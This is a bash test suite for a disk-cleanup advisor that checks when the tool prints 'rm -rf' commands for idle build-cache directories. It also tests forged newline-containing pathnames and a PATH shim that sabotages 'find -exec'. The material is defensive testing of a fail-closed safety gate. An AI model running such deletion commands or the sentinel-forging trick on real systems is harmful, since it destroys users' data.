printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\nfuture\ta\tb\tc\td\ngroup\trebuildable\t26738688\t57\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/fwd.tsv"
from_cache "$TMP/fwd.tsv"
eq "unknown row kind is tolerated"     "$(S 3)" critical

# The affected flag gates the per-group severity cap, so an unrecognised value
# must not fail open into "not affected" — that is the path from one malformed
# row to an inherited-critical finding with a removal command attached.
good_cache "$TMP/aff2.tsv" "group	rebuildable	26738688	57	2"
from_cache "$TMP/aff2.tsv"
eq "affected=2 -> cache_malformed"     "$(S 5)" cache_malformed
eq "  and no finding escapes"          "$(nfind)" 0
good_cache "$TMP/affdash.tsv" "group	rebuildable	26738688	57	-"
from_cache "$TMP/affdash.tsv"
eq "affected='-' is the legacy field"  "$(S 3)" critical
# ...and the pure half caps rather than releases if one ever reaches it.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "scan	1	0	3	3
note	depth_capped	1	-	-
group	rebuildable	26738688	57	2"
eq "unknown affected fails closed"     "$(F disk.reclaimable.rebuildable 4)" info

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\tbogus\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/df.tsv"
from_cache "$TMP/df.tsv"
eq "non-numeric df_size_kb -> bad"     "$(S 5)" cache_malformed
printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t-\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dfdash.tsv"
from_cache "$TMP/dfdash.tsv"
eq "df_size_kb '-' is accepted"        "$(S 3)" critical
hasnt "  and no container claim made"  "$(F disk.volume_low 13)" "APFS container"

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nscan\t1\t0\t1\t3\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dup.tsv"
from_cache "$TMP/dup.tsv"
eq "duplicate scan rows -> malformed"  "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\t42\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/wide.tsv"
from_cache "$TMP/wide.tsv"
eq "a sixth field -> malformed"        "$(S 5)" cache_malformed
printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\ngroup\treb	uildable\t100\t1\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/tabbed.tsv"
from_cache "$TMP/tabbed.tsv"
eq "a tab inside a field -> malformed" "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nepoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dupe.tsv"
from_cache "$TMP/dupe.tsv"
eq "duplicate epoch rows -> malformed" "$(S 5)" cache_malformed

echo "cache states: coverage_incomplete note and the cover row (D1c)"
# The note enum is closed: without coverage_incomplete in it, every cache the
# D1a/D1b scanner writes reads cache_malformed and the whole domain goes
# unknown. Mirrors the depth_capped case above: measured, partial, and no
# measurement_reasons enum value of its own.
printf 'epoch\t-\t%s\t-\t-\nscan\t1\t0\t3\t3\nnote\tcoverage_incomplete\t1\t-\t-\nvol\t/System/Volumes/Data\t%s\t%s\t%s\n' \
  "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" > "$TMP/covnote.tsv"
from_cache "$TMP/covnote.tsv"
eq "coverage_incomplete note validates, not malformed" "$(S 5)" ""
eq "  driving the partial banner"      "$(S 4)" partial
eq "  domain severity is still measured" "$(S 3)" critical

# A cover row is a row we compute on: a non-numeric home_total is malformed.
printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\ncover\thome\tbogus\t1000\t1\n' \
  "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" > "$TMP/covbad.tsv"
from_cache "$TMP/covbad.tsv"
eq "cover row: non-numeric home_total -> malformed" "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\ncover\thome\t1000\t1000\t1\n' \
  "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" > "$TMP/covgood.tsv"
from_cache "$TMP/covgood.tsv"
eq "well-formed cover row validates ok"  "$(S 5)" ""

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\ncover\thome\t1000\t1000\t1\ncover\thome\t2000\t2000\t1\n' \
  "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" > "$TMP/covdup.tsv"
from_cache "$TMP/covdup.tsv"
eq "two cover rows -> malformed"         "$(S 5)" cache_malformed

echo "the coverage sentence, end to end through from_cache/advise_disk"
good_cache "$TMP/cover.tsv" "cover	home	10485760	8388608	1"
from_cache "$TMP/cover.tsv"
has "coverage residual renders in the summary" "$(S 6)" '$HOME is not attributed to any group'
has "  with the correct GiB figure"    "$(S 6)" '2.0 GiB'

good_cache "$TMP/covincomplete.tsv" "cover	home	-	-	0"
from_cache "$TMP/covincomplete.tsv"
has "incomplete coverage is stated"    "$(S 6)" "coverage is incomplete"
hasnt "  and no residual figure is printed" "$(S 6)" "not attributed to any group"

# =========================================================== the re-stat gate ==
# This is the one section that touches a real filesystem, because the gate it
# tests is about the filesystem. Each case below is built so that exactly ONE
# reason to downgrade is present: the tree is otherwise cold and the marker is
# otherwise there, so a passing assertion pins that specific reason.
#
# WHY 151 ASSERTIONS ALL PASSED WHILE THE GATE PRINTED NOTHING. The live tool
# rendered `0 confirmed, 20 likely` over a cache holding 24 confirmed rows, and
# nothing here noticed. Four reasons, each closed by tests added below:
#
#  1. probe_cache writes a cache with exactly ONE group and exactly ONE dir row.
#     No sub-threshold group ever competed for the probe budget, the 3-item
#     action cap was never reached, and with one row confidence-vs-size ordering
#     is unobservable. Every filesystem-touching assertion goes through it.
#     -> the sub-threshold-group filter case and the seam case below.
#  2. The confidence counters are asserted only through pure_body, which calls
#     disk_findings directly and never runs disk_body. The two halves are each
#     tested in isolation and the bug lived precisely in the seam — the cost of
#     the pure/impure split, worth paying only if something crosses it.
#     -> the seam case below is the one assertion whose left side is the cache
#        and whose right side is the rendered text.
#  3. Both budget assertions test the CLOSED direction only: force the bound to
#     0 or 1, assert no command. A gate that is closed too often passes every
#     fail-closed test ever written.
#     -> the 1s-budget and entry-cap-boundary cases assert the open direction.
#  4. No fixture ever created an unreadable subtree, so find's discarded exit
#     status was never exercised.  -> the permfail case.
echo "revalidation before printing a command"
OLD=$(date -v-60d +%Y%m%d%H%M.%S)
# TMP is under /var, which is a symlink to /private/var on macOS, so the
# command must name the resolved object rather than the cached string.
TMPR=$(cd -P -- "$TMP" && pwd -P)

mk_target() {  # <parent> — a cold Rust target tree with its marker in place
  mkdir -p "$1/target/debug/deps"
  : > "$1/Cargo.toml"
  : > "$1/target/debug/deps/libfoo.rlib"
  : > "$1/target/marker"
  # Children before parents: writing a child bumps the parent's mtime.
  touch -t "$OLD" "$1/target/debug/deps/libfoo.rlib" "$1/target/marker" \
                  "$1/target/debug/deps" "$1/target/debug" "$1/target" \
                  "$1/Cargo.toml" "$1"
}
probe_cache() {  # <name> <dir> -> runs advise_disk over a cache naming <dir>
  good_cache "$TMP/$1.tsv" "group	rebuildable	26738688	57	0
dir	$2	20000000	rebuildable	confirmed"
  from_cache "$TMP/$1.tsv"
}

mk_target "$TMP/cold"
probe_cache cold "$TMP/cold/target"
has "cold + marker: command printed"   "$(F disk.reclaimable.rebuildable 14)" "rm -rf '$TMPR/cold/target'"
eq "  confidence stays confirmed"      "$(F disk.reclaimable.rebuildable 11)" confirmed
has "  command names the resolved path" "$(F disk.reclaimable.rebuildable 14)" "$TMPR/cold/target"

# NESTED activity. Every depth-1 mtime is still 60 days old; only a file three
# levels down was written. A depth-1 probe calls this idle and authors a
# deletion for a live build cache.
mk_target "$TMP/nested"
touch "$TMP/nested/target/debug/deps/libfoo.rlib"
touch -t "$OLD" "$TMP/nested/target/debug/deps" "$TMP/nested/target/debug" "$TMP/nested/target"
probe_cache nested "$TMP/nested/target"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "nested write: no command"       "$A" "rm -rf"
has "  downgraded to likely"           "$A" "in active use, rebuilt on next build"
eq "  and the group says so"           "$(F disk.reclaimable.rebuildable 11)" likely

# MARKER gone: the tree is cold, but the Cargo.toml that made it `confirmed`
# has been deleted, so the cached verdict describes something absent.
mk_target "$TMP/nomarker"
rm -f "$TMP/nomarker/Cargo.toml"
probe_cache nomarker "$TMP/nomarker/target"
hasnt "marker deleted: no command"     "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
eq "  downgraded"                      "$(F disk.reclaimable.rebuildable 11)" likely

# §3c also accepts pom.xml as the marker for `target`. Still confirmed, and
# still an rm -rf rather than a Rust cleaner pointed at a Maven directory.
mk_target "$TMP/maven"
rm -f "$TMP/maven/Cargo.toml"
: > "$TMP/maven/pom.xml"; touch -t "$OLD" "$TMP/maven/pom.xml" "$TMP/maven"
probe_cache maven "$TMP/maven/target"
eq "pom.xml is a valid marker too"     "$(F disk.reclaimable.rebuildable 11)" confirmed
hasnt "  and cargo is not invoked"     "$(F disk.reclaimable.rebuildable 14)" cargo

# A kind with no re-derivable marker gets no command however cold it is.
mkdir -p "$TMP/mystery/blob"; touch -t "$OLD" "$TMP/mystery/blob" "$TMP/mystery"
probe_cache mystery "$TMP/mystery/blob"
hasnt "unknown kind: no command"       "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# The final component being a symlink: rm -rf would remove the link, not the
# tree, so the command would not do what its text says.
mk_target "$TMP/real"
ln -s "$TMP/real/target" "$TMP/linked-target"
probe_cache symlink "$TMP/linked-target"
hasnt "symlinked dir: no command"      "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

mkdir -p "$TMP/hot/target"; : > "$TMP/hot/Cargo.toml"; : > "$TMP/hot/target/artifact"
probe_cache hot "$TMP/hot/target"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "touched since the scan: no cmd" "$A" "rm -rf"
has "  downgraded to likely"           "$A" "in active use, rebuilt on next build"

probe_cache gone "$TMP/vanished/target"
hasnt "vanished dir gets no command"   "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# Both probe bounds must fail CLOSED. Each is forced by shrinking its constant.
save_e=$DISK_PROBE_ENTRIES; DISK_PROBE_ENTRIES=1
probe_cache budget "$TMP/cold/target"
hasnt "entry budget exhausted: no cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$save_e
save_s=$DISK_PROBE_SECONDS; DISK_PROBE_SECONDS=0
probe_cache clock "$TMP/cold/target"
hasnt "wall-clock budget spent: no cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_SECONDS=$save_s
# ...and the OPEN direction, which nothing asserted before: a small budget must
# still admit the first probe. A four-entry tree costs microseconds, so a
# failure here means the budget was spent before any probe started.
#
# 2, not 1, and the reason is the point: bash keeps SECONDS as whole-second
# time() values on both sides, so `SECONDS=0` followed 50ms later by a second
# boundary already reads 1 (measured). A 1s budget therefore fails here perhaps
# 1% of runs — a real flake, and a real statement about the constant: a budget
# of N buys as little as N-1 seconds. `>= 2` needs a genuine second boundary
# pair, which this fixture cannot cross. The sub-second phase itself is NOT
# directly testable — you cannot deterministically place the fixture at a chosen
# fractional offset into a wall-clock second — so the rebase is a review item,
# not an assertion. Said out loud rather than pretending coverage.
DISK_PROBE_SECONDS=2
probe_cache clock1 "$TMP/cold/target"
has "a 2s budget still admits a probe" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_SECONDS=$save_s
probe_cache cold2 "$TMP/cold/target"
has "  and the bounds are restored"    "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# The entry cap boundary, both sides. The probe only returns idle when the walk
# printed its completion sentinel, and the reader drops that sentinel exactly when
# the tree is larger than the cap — so a tree of EXACTLY the cap completes and
# one entry more does not. Counted from the tree itself, never hard-coded.
CE=$(find "$TMP/cold/target" | grep -c '')
save_e=$DISK_PROBE_ENTRIES
DISK_PROBE_ENTRIES=$CE
probe_cache capat "$TMP/cold/target"
has "tree exactly at the entry cap: cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$(( CE - 1 ))
probe_cache capover "$TMP/cold/target"
hasnt "one entry over the cap: no cmd"  "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$save_e

# An unreadable subtree must fail CLOSED. BSD find exits 1 and prints a short
# list with no sentinel; before the completion sentinel existed that read as
# "no recent entry found" = idle, and authored an rm -rf for a tree nobody
# could inspect. Root can read anything, so root skips rather than lies.
if [ "$(id -u)" = 0 ]; then
  ok "unreadable subtree fails closed (skipped: running as root)"
else
  mk_target "$TMP/permfail"
  mkdir -p "$TMP/permfail/target/locked"; : > "$TMP/permfail/target/locked/f"
  touch -t "$OLD" "$TMP/permfail/target/locked/f" "$TMP/permfail/target/locked" \
                  "$TMP/permfail/target" "$TMP/permfail"
  chmod 000 "$TMP/permfail/target/locked"
  probe_cache permfail "$TMP/permfail/target"
  A=$(F disk.reclaimable.rebuildable 14)
  hasnt "unreadable subtree: no command" "$A" "rm -rf"
  eq "  and downgraded to likely"        "$(F disk.reclaimable.rebuildable 11)" likely
  chmod 755 "$TMP/permfail/target/locked"
fi

# The completion sentinel must not be forgeable by a PATHNAME. A path may
# contain any byte but NUL and '/', so a directory named $'x\n<stamp>-done'
# emitted a newline-delimited line equal to the sentinel; as the last thing
# printed before the walk aborted, it said "the walk completed" and PROMOTED
# the row to idle — the one direction this file may never move in.
#
# Driven through disk_probe_idle directly rather than through a render,
# because the sentinel is derived from a mktemp basename that only the caller
# knows: with a stamp we name ourselves the forged directory name is exact and
# the test is deterministic. The forger is the tree's ONLY child, so find's
# pre-order walk emits it in a fixed position and no readdir ordering is
# assumed. The stamp is created last, hence newer than every entry, so the
# tree is genuinely cold and only the completion evidence is in question.
FG=$TMP/forge; FT=$FG/tree; FD=$FT/$'x\ncw-disk-idle.FORGE-done'
mkdir -p "$FD"; : > "$FD/f"
touch -t "$OLD" "$FD/f" "$FD" "$FT"
: > "$FG/cw-disk-idle.FORGE"
# First the OPEN direction: a newline in a pathname is not itself suspicious,
# and a complete walk over one still reads idle.
if disk_probe_idle "$FT" "$FG/cw-disk-idle.FORGE"; then ok "a newline in a pathname still completes"
else bad "a newline in a pathname still completes"; fi
# Cut the walk short exactly after the forged sentinel: under newline framing a
# cap of 2 admitted three lines — 'tree', 'x', '<stamp>-done' — and the last of
# them read as completion. The tree is over the cap, so the only correct answer
# is not-idle.
save_e=$DISK_PROBE_ENTRIES; DISK_PROBE_ENTRIES=2
if disk_probe_idle "$FT" "$FG/cw-disk-idle.FORGE"; then bad "forged sentinel at the cap: not idle"
else ok "forged sentinel at the cap: not idle"; fi
DISK_PROBE_ENTRIES=$save_e
# And with the walk aborted instead of truncated: find prints the forger, then
# cannot descend into it, exits 1 and emits no completion record.
if [ "$(id -u)" = 0 ]; then
  ok "forged sentinel before a failure: not idle (skipped: running as root)"
else
  chmod 000 "$FD"
  if disk_probe_idle "$FT" "$FG/cw-disk-idle.FORGE"; then bad "forged sentinel before a failure: not idle"
  else ok "forged sentinel before a failure: not idle"; fi
  chmod 755 "$FD"
fi

# The HOT signal must not depend on a forked utility. `\( -newer -exec printf
# \; -quit \)` is an implicit AND: when the child fails the predicate is FALSE,
# so -quit never runs, find falls through to `-o -print0`, walks the whole tree
# and exits 0, and the completion record is emitted — a tree with an entry
# newer than the stamp read as IDLE and got an rm -rf. Not hypothetical: -exec
# resolves its utility through PATH, and fork/exec fails transiently under the
# memory pressure this tool exists to report on.
#
# Forced deterministically by putting a `printf` that exits 1 first on PATH.
# The shell's own printf is a BUILTIN, so nothing else in the probe sees the
# shim — only `find -exec` resolves through PATH.
mkdir -p "$TMP/shim"
printf '#!/bin/sh\nexit 1\n' > "$TMP/shim/printf"; chmod 755 "$TMP/shim/printf"
save_path=$PATH
# Direct, with a stamp we name: the tree is fresh, the stamp is 60 days old, so
# every entry is newer than it and the only correct answer is not-idle.
EF=$TMP/execfail; mkdir -p "$EF/tree/sub"; : > "$EF/tree/sub/f"
: > "$EF/cw-disk-idle.EXEC"; touch -t "$OLD" "$EF/cw-disk-idle.EXEC"
PATH=$TMP/shim:$PATH
if disk_probe_idle "$EF/tree" "$EF/cw-disk-idle.EXEC"; then bad "a failing -exec cannot promote a hot tree"
else ok "a failing -exec cannot promote a hot tree"; fi
PATH=$save_path
# And through the render, on the shape that matters: a cold tree with a live
# write three levels down, which is exactly the confirmed row the gate exists
# to downgrade.
mk_target "$TMP/execfail2"
touch "$TMP/execfail2/target/debug/deps/libfoo.rlib"
touch -t "$OLD" "$TMP/execfail2/target/debug/deps" "$TMP/execfail2/target/debug" \
                "$TMP/execfail2/target"
PATH=$TMP/shim:$PATH
probe_cache execfail2 "$TMP/execfail2/target"
PATH=$save_path
A=$(F disk.reclaimable.rebuildable 14)
hasnt "  and no command reaches the render" "$A" "rm -rf"
eq "  confidence downgraded to likely"      "$(F disk.reclaimable.rebuildable 11)" likely
# The open direction, so the shim is not just breaking every probe: the same
# PATH over a genuinely cold tree still completes and still prints its command.
PATH=$TMP/shim:$PATH
probe_cache execok "$TMP/cold/target"
PATH=$save_path
has "  a cold tree still gets its command" "$(F disk.reclaimable.rebuildable 14)" "rm -rf '$TMPR/cold/target'"

# A group under the 2% line produces no finding, so none of its dir rows can
# ever be printed — and probing them spends the budget the publishable rows
# need. The sub-threshold group is listed FIRST, exactly as the real cache
# orders it, and DISK_RESTAT_MAX is forced to 2 so the budget is provably
# smaller than the work: without the filter both probes land on rows that are
# then discarded and the rebuildable group loses every command. The marker
# re-check keys off the basename, not the group label, so `target` trees stand
# in for node_modules trees here and the case needs no second tree shape.
mk_target "$TMP/nm1"; mk_target "$TMP/nm2"; mk_target "$TMP/nm3"
mk_target "$TMP/rb1"; mk_target "$TMP/rb2"
good_cache "$TMP/filter.tsv" "group	node_modules	8845750	3	0
dir	$TMP/nm1/target	3000000	node_modules	confirmed
dir	$TMP/nm2/target	2000000	node_modules	confirmed
dir	$TMP/nm3/target	1000000	node_modules	confirmed
group	rebuildable	26738688	2	0
dir	$TMP/rb1/target	9000000	rebuildable	confirmed
dir	$TMP/rb2/target	8000000	rebuildable	confirmed"
save_r=$DISK_RESTAT_MAX; DISK_RESTAT_MAX=2
# node_modules (8845750 KB, 8.4 GiB) clears the 5 GiB floor on its own, so the
# floor knob is pinned high to keep it below the line — this case is about the
# percent gate's probe filter, not the floor.
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 from_cache "$TMP/filter.tsv"
DISK_RESTAT_MAX=$save_r
A=$(F disk.reclaimable.rebuildable 14)
has "budget goes to the published group" "$A" "rm -rf '$TMPR/rb1/target'"
has "  both published rows revalidated" "$A" "rm -rf '$TMPR/rb2/target'"
has "  and the render agrees with the cache" "$(F disk.reclaimable.rebuildable 13)" "Confidence: 2 confirmed, 0 likely"
eq "  sub-threshold group emits nothing" "$(nfind)" 2

# Predicate parity: disk_body's probe filter and disk_findings' publish test are
# one function, so the group that gets a finding is exactly the group that gets
# its rows revalidated. Asserted at the boundary, where a one-KB disagreement
# between two copies of the test would show.
good_cache "$TMP/parityin.tsv" "group	rebuildable	8845751	1	0
dir	$TMP/rb1/target	8845751	rebuildable	confirmed"
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 from_cache "$TMP/parityin.tsv"
eq "group exactly at the 2% line: finding" "$(nfind)" 2
has "  and its command is printed"     "$(F disk.reclaimable.rebuildable 14)" "rm -rf '$TMPR/rb1/target'"
good_cache "$TMP/parityout.tsv" "group	rebuildable	8845750	1	0
dir	$TMP/rb1/target	8845750	rebuildable	confirmed"
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 from_cache "$TMP/parityout.tsv"
eq "one KB below: no finding at all"   "$(nfind)" 1

# THE SEAM. The whole file's missing assertion class is "the cache says
# confirmed, the render says likely": every other case here either builds the
# cache and stops at disk_body, or hand-writes fact rows and starts at
# disk_findings. This one runs a realistic multi-group cache — three cold
# confirmed rows in a sub-2% group listed FIRST, five in the published one —
# all the way through advise_disk and reads the rendered text.
mk_target "$TMP/rb3"; mk_target "$TMP/rb4"; mk_target "$TMP/rb5"
good_cache "$TMP/seam.tsv" "group	node_modules	8845750	3	0
dir	$TMP/nm1/target	3000000	node_modules	confirmed
dir	$TMP/nm2/target	2000000	node_modules	confirmed
dir	$TMP/nm3/target	1000000	node_modules	confirmed
group	rebuildable	26738688	5	0
dir	$TMP/rb1/target	9000000	rebuildable	confirmed
dir	$TMP/rb2/target	8000000	rebuildable	confirmed
dir	$TMP/rb3/target	7000000	rebuildable	confirmed
dir	$TMP/rb4/target	6000000	rebuildable	confirmed
dir	$TMP/rb5/target	5000000	rebuildable	confirmed"
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 from_cache "$TMP/seam.tsv"
A=$(F disk.reclaimable.rebuildable 14)
has "seam: the render agrees with the cache" "$(F disk.reclaimable.rebuildable 13)" \
  "Confidence: 5 confirmed, 0 likely, 0 unverified"
eq "  and DISK_ACTION_MAX commands print" \
  "$(printf '%s\n' "$A" | grep -o -- 'rm -rf' | grep -c '')" "$DISK_ACTION_MAX"
has "  largest first inside the tier"  "$(first_item "$A")" "rm -rf '$TMPR/rb1/target'"
has "  the remainder is counted"       "$A" "+ 2 more"

# D2c: the revalidation budget must follow size, not cache order. Group A
# (node_modules, published) lists 20 small confirmed rows FIRST; group B
# (rebuildable, published) lists 5 large confirmed rows SECOND — the same
# shape as the live cache the plan diagnosed. DISK_RESTAT_MAX is forced to 5,
# provably smaller than A's row count alone: under cache-order spending, A's
# first 5 rows exhaust the whole budget before B is ever reached and B loses
# every command to rows 1000x smaller. A's rows never need to exist on disk —
# not being selected means disk_confirm_still_valid is never called on them.
mk_target "$TMP/big1"; mk_target "$TMP/big2"; mk_target "$TMP/big3"
mk_target "$TMP/big4"; mk_target "$TMP/big5"
budget_body=$(printf 'group\tnode_modules\t26738688\t20\t0\n'
  for n in $(seq 1 20); do
    printf 'dir\t%s/tiny%d/target\t%d000\tnode_modules\tconfirmed\n' "$TMP" "$n" "$n"
  done
  printf 'group\trebuildable\t26738688\t5\t0\n'
  printf 'dir\t%s/big1/target\t9000000\trebuildable\tconfirmed\n' "$TMP"
  printf 'dir\t%s/big2/target\t8000000\trebuildable\tconfirmed\n' "$TMP"
  printf 'dir\t%s/big3/target\t7000000\trebuildable\tconfirmed\n' "$TMP"
  printf 'dir\t%s/big4/target\t6000000\trebuildable\tconfirmed\n' "$TMP"
  printf 'dir\t%s/big5/target\t5000000\trebuildable\tconfirmed' "$TMP")
good_cache "$TMP/budget.tsv" "$budget_body"
save_r=$DISK_RESTAT_MAX; DISK_RESTAT_MAX=5
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 from_cache "$TMP/budget.tsv"
DISK_RESTAT_MAX=$save_r
has "budget follows size: B's largest gets a command" \
  "$(F disk.reclaimable.rebuildable 14)" "rm -rf '$TMPR/big1/target'"
has "  and B's 5 rows are all revalidated" \
  "$(F disk.reclaimable.rebuildable 13)" "Confidence: 5 confirmed, 0 likely"
has "  displaced group A still produces a finding, 0 confirmed" \
  "$(F disk.reclaimable.node_modules 13)" "Confidence: 0 confirmed, 20 likely"
hasnt "  and A's action carries no command" \
  "$(F disk.reclaimable.node_modules 14)" "rm -rf"

# The 14d boundary, pinned without a wall-clock race. `find -newer` is strict,
# so an entry sitting exactly on the stamp reads as idle — which is precisely
# why disk_body builds the stamp at `date -v-14d -v-1S`, one second BEFORE the
# cutoff, so that "exactly 14 days old" comes out active.
BT=$TMP/boundary; mkdir -p "$BT/tree"; : > "$BT/tree/entry"
touch -t "$OLD" "$BT/tree/entry" "$BT/tree"
: > "$BT/at"; : > "$BT/before"
touch -r "$BT/tree/entry" "$BT/at"                    # stamp == entry mtime
# Derived from the entry itself, not from `date`: anything wall-clock based
# here races the fixture's own runtime and the test flakes by a second.
EM=$(stat -f %m "$BT/tree/entry")
touch -t "$(date -r $((EM - 1)) +%Y%m%d%H%M.%S)" "$BT/before"  # stamp == entry - 1s
if disk_probe_idle "$BT/tree" "$BT/at"; then ok "entry exactly at the stamp reads idle"
else bad "entry exactly at the stamp reads idle"; fi
if disk_probe_idle "$BT/tree" "$BT/before"; then bad "one second of slack makes it active"
else ok "one second of slack makes it active"; fi
# The two above pin the semantics; this pins the WIRING — that disk_body really
# builds its stamp with DISK_IDLE_SLACK_S applied. Widening the slack to 100
# days must drag the 60-day-old cold tree onto the active side of the cutoff.
save_k=$DISK_IDLE_SLACK_S; DISK_IDLE_SLACK_S=$(( 100 * 86400 ))
probe_cache slack "$TMP/cold/target"
hasnt "slack is wired into the stamp"  "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_IDLE_SLACK_S=$save_k

# E4 material: the age prints beside every command and names staleness past 6h.
NOW6=$(( NOW - 30000 ))
printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\ngroup\trebuildable\t26738688\t57\t0\ndir\t%s\t20000000\trebuildable\tconfirmed\n' \
  "$NOW6" "$V_USED" "$V_AVAIL" "$V_DF" "$TMP/cold/target" > "$TMP/stale.tsv"
from_cache "$TMP/stale.tsv"
has "stale cache is named as stale"    "$(F disk.reclaimable.rebuildable 14)" "cache is 8h old (stale, refreshed every 6h);"
from_cache "$TMP/cold.tsv"
A=$(F disk.reclaimable.rebuildable 14)
has "fresh cache still prints an age"  "$A" "cache is "
hasnt "  but does not call it stale"   "$A" "(stale, refreshed every 6h)"

# ================================================================== thresholds ==
echo "threshold overrides"
r=$( CLAUDE_WATCH_DISK_CRIT_PCT=40 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null )
eq "raising the crit pct still crits"  "$(printf '%s\n' "$r" | awk -F'\t' '$1=="S"{print $3}')" critical
r=$( CLAUDE_WATCH_DISK_CRIT_GIB=1 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null )
eq "lowering the crit GiB -> warn"     "$(printf '%s\n' "$r" | awk -F'\t' '$1=="S"{print $3}')" warn
# 26738688 KB (25.5 GiB) clears the 5 GiB floor outright, so the floor knob is
# pinned high here too — this case is about the percent knob alone.
r=$( CLAUDE_WATCH_DISK_GROUP_WARN_PCT=10 CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 <<< "group	rebuildable	26738688	57	0" )
eq "raising the group pct hides it"    "$(printf '%s\n' "$r" | grep -c '^F')" 1

for badv in 2.5 -1 abc ''; do
  ( CLAUDE_WATCH_DISK_GROUP_WARN_PCT="$badv" disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null ) >/dev/null 2>&1
  rc=$?
  if [ "$badv" = '' ]; then
    eq "empty override falls back"     "$rc" 0
  else
    eq "override '$badv' exits 2"      "$rc" 2
  fi
done

msg=$( CLAUDE_WATCH_DISK_GROUP_WARN_GIB=abc disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null 2>&1 >/dev/null )
rc=$?
eq "GROUP_WARN_GIB=abc exits 2"        "$rc" 2
has "  message shape matches the other knobs" "$msg" 'CLAUDE_WATCH_DISK_GROUP_WARN_GIB="abc" is not a non-negative integer'
eq "disk_default_for reports 5 for it" "$(disk_default_for CLAUDE_WATCH_DISK_GROUP_WARN_GIB)" 5

# ================================================================== invariants ==
echo "invariants"
all=''
for c in "$TMP/does-not-exist.tsv" "$TMP/trunc.tsv" "$TMP/ok.tsv" "$TMP/cold.tsv" "$TMP/hot.tsv" "$TMP/note.tsv"; do
  from_cache "$c"; all="$all$OUT"$'\n'
  st=$(S 4); sv=$(S 3)
  if [ "$st" = unavailable ] && [ "$sv" != unknown ]; then bad "unavailable <=> unknown ($c)"; fi
  if [ "$sv" = unknown ] && [ "$st" != unavailable ]; then bad "unavailable <=> unknown ($c)"; fi
  if [ "$st" != complete ] && [ -z "$(S 7)" ]; then bad "remedy required when not complete ($c)"; fi
  if [ "$st" = unavailable ] && [ "$(nfind)" != 0 ]; then bad "unavailable emits no findings ($c)"; fi
done
ok "unavailable <=> unknown, remedy present, no findings when unavailable"

hasnt "no nan anywhere"                "$all" nan
hasnt "no inf anywhere"                "$all" inf
eq "share guards a zero denominator"   "$(disk_share 100 0)" 0
eq "  and an empty one"                "$(disk_share 100 '')" 0

# Every row is exactly the §3b width, and no field carries a tab or a newline.
from_cache "$TMP/ok.tsv"
widths=$(printf '%s\n' "$OUT" | awk -F'\t' '{print $1 NF}' | sort -u | tr '\n' ' ')
eq "row widths are S=7 and F=14"       "$widths" "F14 S7 "
printf '%s\n' "$OUT" | awk -F'\t' 'NF!=7 && NF!=14 {exit 1}' && ok "no field split a row" || bad "no field split a row"

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
